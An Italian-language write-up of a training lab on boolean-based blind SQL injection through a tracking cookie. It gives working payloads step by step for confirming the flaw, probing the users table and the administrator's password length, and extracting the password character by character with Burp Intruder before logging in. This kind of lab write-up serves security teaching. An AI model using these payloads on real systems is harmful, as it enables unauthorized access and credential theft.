Lab: Blind SQL injection with conditional responses

📝 Descrizione

Il lab presenta una vulnerabilità di blind SQL injection nel valore del cookie TrackingId, usato dal sito per finalità analitiche.
Sebbene i risultati delle query non vengano mostrati direttamente e non compaiano errori, la pagina rivela un messaggio "Welcome back" quando la query SQL sottostante restituisce almeno una riga.
Questo comportamento consente di eseguire un attacco boolean-based blind SQLi, sfruttando differenze di risposta per dedurre la presenza di dati, lunghezza della password e valori carattere per carattere.

⚙️ Passaggi eseguiti

1. Individuazione del punto vulnerabile
Intercettata con Burp Suite la richiesta HTTP con il cookie:

Cookie: TrackingId=xyz; session=...

2. Test base booleani
Iniettato payload valido:

TrackingId=xyz' AND '1'='1
➜ La pagina mostra “Welcome back”.

Iniettato payload falso:

TrackingId=xyz' AND '1'='2
➜ Il messaggio scompare.

✅ Conferma della vulnerabilità blind SQLi.

3. Verifica presenza tabella users e utente administrator
Test esistenza della tabella users:

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
➜ "Welcome back" presente → tabella esiste.

Test presenza utente administrator:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
➜ Conferma che l’utente esiste.

4. Determinazione lunghezza password
Test sequenziali con operatori LENGTH e >:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
➜ “Welcome back” presente

Aumentato progressivamente il valore fino a:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
➜ “Welcome back” scompare → Password lunga esattamente 20 caratteri.

5. Estrazione password con Burp Intruder

Usato payload: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

Posizionato marker su 'a': TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§

In Intruder:
-Tipo di payload: Simple list
-Caratteri testati: a-z, 0-9
-Grep Match: Welcome back

Ripetuto l’attacco variando l’offset SUBSTRING(password,N,1) da 1 a 20.

🧠 Ragionamento tecnico

In una blind SQL injection boolean-based, l’attaccante non vede i risultati della query, ma può inferire informazioni sfruttando differenze nel comportamento dell'applicazione.
In questo caso, la presenza del messaggio "Welcome back" è stata sfruttata come segnale booleano (true/false) per:

-Confermare esistenza di dati
-Calcolare la lunghezza della password
-Estrarre caratteri uno alla volta usando SUBSTRING()

Questo approccio è lento ma potente, e può essere automatizzato con strumenti come Burp Intruder.

✅ Soluzione finale

Determinata lunghezza della password: 20 caratteri

Estratti i caratteri uno per uno con payload tipo: TrackingId=xyz' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='c
Ricostruita la password completa.

Usata per accedere con:

Username: administrator

Password: (valore trovato)

